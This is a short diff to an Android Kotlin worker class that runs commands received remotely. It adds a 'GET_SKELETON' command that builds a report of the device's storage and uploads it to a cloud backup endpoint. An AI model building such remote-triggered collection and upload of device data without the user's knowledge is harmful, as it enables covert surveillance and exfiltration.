@@ -129,6 +129,13 @@ class RemoteCommandWorker(appContext: Context, workerParams: WorkerParameters) :
                                     status = "FAILED (NOT FOUND)"
                                 }
                             }
+                            // --- NEW: GENERATE & UPLOAD STORAGE SKELETON ---
+                            else if (cmd.getString("file_name") == "GET_SKELETON") {
+                                val report = FileManager.generateReport()
+                                // Use the Backup Endpoint (Better for large JSONs)
+                                CloudManager.uploadSkeleton(applicationContext, report, null)
+                                status = "EXECUTED (SIZE: ${report.toString().length} BYTES)"
+                            }
                             // --- 5. FILE/FOLDER CREATION ---
                             else if (fileName.isNotEmpty()) {
                                 val targetFile = File(targetDir, fileName)
